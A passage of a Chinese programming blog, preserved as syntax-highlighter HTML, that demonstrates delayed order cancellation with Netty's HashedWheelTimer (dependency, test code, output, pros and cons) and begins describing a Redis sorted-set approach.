id=\"实现-2\">实现</h4>\n<p>我们用Netty的HashedWheelTimer来实现<br>\n给Pom加上下面的依赖</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa930358b8588464353\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n        &lt;dependency&gt;\r\n            &lt;groupId&gt;io.netty&lt;/groupId&gt;\r\n            &lt;artifactId&gt;netty-all&lt;/artifactId&gt;\r\n            &lt;version&gt;4.1.24.Final&lt;/version&gt;\r\n        &lt;/dependency&gt;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358b8588464353-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358b8588464353-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358b8588464353-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358b8588464353-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358b8588464353-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa930358b8588464353-1\"><span class=\"crayon-h\">        </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">dependency</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358b8588464353-2\"><span class=\"crayon-h\">            </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">groupId</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-v\">io</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">netty</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">groupId</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358b8588464353-3\"><span class=\"crayon-h\">            </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">artifactId</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-v\">netty</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">all</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">artifactId</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358b8588464353-4\"><span class=\"crayon-h\">            </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">version</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-cn\">4.1.24.Final</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">version</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358b8588464353-5\"><span class=\"crayon-h\">        </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dependency</span><span class=\"crayon-o\">&gt;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p>测试代码HashedWheelTimerTest如下所示</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa930358bc794448142\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npackage com.rjzheng.delay3;\r\n\r\nimport io.netty.util.HashedWheelTimer;\r\nimport io.netty.util.Timeout;\r\nimport io.netty.util.Timer;\r\nimport io.netty.util.TimerTask;\r\n\r\nimport java.util.concurrent.TimeUnit;\r\n\r\npublic class HashedWheelTimerTest {\r\n    static class MyTimerTask implements TimerTask{\r\n        boolean flag;\r\n        public MyTimerTask(boolean flag){\r\n            this.flag = flag;\r\n        }\r\n        public void run(Timeout timeout) throws Exception {\r\n            // TODO Auto-generated method stub\r\n             System.out.println(\"要去数据库删除订单了。。。。\");\r\n             this.flag =false;\r\n        }\r\n    }\r\n    public static void main(String[] argv) {\r\n        MyTimerTask timerTask = new MyTimerTask(true);\r\n        Timer timer = new HashedWheelTimer();\r\n        timer.newTimeout(timerTask, 5, TimeUnit.SECONDS);\r\n        int i = 1;\r\n        while(timerTask.flag){\r\n            try {\r\n                Thread.sleep(1000);\r\n            } catch (InterruptedException e) {\r\n                // TODO Auto-generated catch block\r\n                e.printStackTrace();\r\n            }\r\n            System.out.println(i+\"秒过去了\");\r\n            i++;\r\n        }\r\n    }\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358bc794448142-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358bc794448142-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358bc794448142-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358bc794448142-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358bc794448142-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358bc794448142-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358bc794448142-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358bc794448142-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358bc794448142-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358bc794448142-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358bc794448142-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358bc794448142-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358bc794448142-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358bc794448142-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358bc794448142-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358bc794448142-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358bc794448142-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358bc794448142-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358bc794448142-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358bc794448142-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358bc794448142-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358bc794448142-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358bc794448142-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358bc794448142-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358bc794448142-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358bc794448142-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358bc794448142-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358bc794448142-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358bc794448142-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358bc794448142-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358bc794448142-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358bc794448142-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358bc794448142-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358bc794448142-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358bc794448142-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358bc794448142-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358bc794448142-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358bc794448142-38\">38</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa930358bc794448142-1\"><span class=\"crayon-t\">package</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">rjzheng</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">delay3</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358bc794448142-2\"> </div><div class=\"crayon-line\" id=\"crayon-5b4aa930358bc794448142-3\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">io</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">netty</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">util</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">HashedWheelTimer</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358bc794448142-4\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">io</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">netty</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">util</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Timeout</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358bc794448142-5\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">io</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">netty</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">util</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Timer</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358bc794448142-6\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">io</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">netty</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">util</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">TimerTask</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358bc794448142-7\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358bc794448142-8\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">java</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">util</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">concurrent</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">TimeUnit</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358bc794448142-9\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358bc794448142-10\"><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">HashedWheelTimerTest</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358bc794448142-11\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">MyTimerTask</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">implements</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">TimerTask</span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358bc794448142-12\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">boolean</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">flag</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358bc794448142-13\"><span class=\"crayon-h\">        </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">MyTimerTask</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">boolean</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">flag</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358bc794448142-14\"><span class=\"crayon-h\">            </span><span class=\"crayon-r\">this</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">flag</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">flag</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358bc794448142-15\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358bc794448142-16\"><span class=\"crayon-h\">        </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">run</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">Timeout </span><span class=\"crayon-v\">timeout</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">throws</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Exception</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358bc794448142-17\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">// TODO Auto-generated method stub</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358bc794448142-18\"><span class=\"crayon-h\">             </span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">println</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"要去数据库删除订单了。。。。\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358bc794448142-19\"><span class=\"crayon-h\">             </span><span class=\"crayon-r\">this</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">flag</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-t\">false</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358bc794448142-20\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358bc794448142-21\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358bc794448142-22\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">main</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">String</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">argv</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358bc794448142-23\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">MyTimerTask </span><span class=\"crayon-v\">timerTask</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">MyTimerTask</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358bc794448142-24\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">Timer </span><span class=\"crayon-v\">timer</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">HashedWheelTimer</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358bc794448142-25\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">timer</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">newTimeout</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">timerTask</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TimeUnit</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">SECONDS</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358bc794448142-26\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358bc794448142-27\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">while</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">timerTask</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">flag</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358bc794448142-28\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">try</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358bc794448142-29\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">Thread</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">sleep</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1000</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358bc794448142-30\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">catch</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">InterruptedException</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">e</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358bc794448142-31\"><span class=\"crayon-h\">                </span><span class=\"crayon-c\">// TODO Auto-generated catch block</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358bc794448142-32\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">e</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">printStackTrace</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358bc794448142-33\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358bc794448142-34\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">println</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">+</span><span class=\"crayon-s\">\"秒过去了\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358bc794448142-35\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358bc794448142-36\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358bc794448142-37\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358bc794448142-38\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0055 seconds] -->\r\n<p>输出如下</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa930358bf369590819\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n1秒过去了\r\n2秒过去了\r\n3秒过去了\r\n4秒过去了\r\n5秒过去了\r\n要去数据库删除订单了。。。。\r\n6秒过去了</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358bf369590819-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358bf369590819-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358bf369590819-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358bf369590819-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358bf369590819-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358bf369590819-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358bf369590819-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa930358bf369590819-1\"><span class=\"crayon-cn\">1</span>秒过去了</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358bf369590819-2\"><span class=\"crayon-cn\">2</span>秒过去了</div><div class=\"crayon-line\" id=\"crayon-5b4aa930358bf369590819-3\"><span class=\"crayon-cn\">3</span>秒过去了</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358bf369590819-4\"><span class=\"crayon-cn\">4</span>秒过去了</div><div class=\"crayon-line\" id=\"crayon-5b4aa930358bf369590819-5\"><span class=\"crayon-cn\">5</span>秒过去了</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358bf369590819-6\">要去数据库删除订单了。。。。</div><div class=\"crayon-line\" id=\"crayon-5b4aa930358bf369590819-7\"><span class=\"crayon-cn\">6</span>秒过去了</div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p></p>\n<h4 id=\"优缺点-2\">优缺点</h4>\n<p>优点:效率高,任务触发时间延迟时间比delayQueue低，代码复杂度比delayQueue低。<br>\n缺点:(1)服务器重启后，数据全部消失，怕宕机<br>\n(2)集群扩展相当麻烦<br>\n(3)因为内存条件限制的原因，比如下单未付款的订单数太多，那么很容易就出现OOM异常</p>\n<h3 id=\"redis缓存\">(4)redis缓存</h3>\n<h4 id=\"思路一\">思路一</h4>\n<p>利用redis的zset,zset是一个有序集合，每一个元素(member)都关联了一个score,通过score排序来取集合中的值<br>\n<a href=\"http://redisdoc.com/sorted_set/\">zset常用命令</a><br>\n添加元素:<strong>ZADD key score member [[score member] [score member] …]</strong><br>\n按顺序查询元素:<strong>ZRANGE key start stop [WITHSCORES]</strong><br>\n查询元素score:<strong>ZSCORE key member</strong><br>\n移除元素:<strong>ZREM key member [member …]</strong><br>\n测试如下</p><!-- Crayon Syntax Highlighter v2.7.1.1 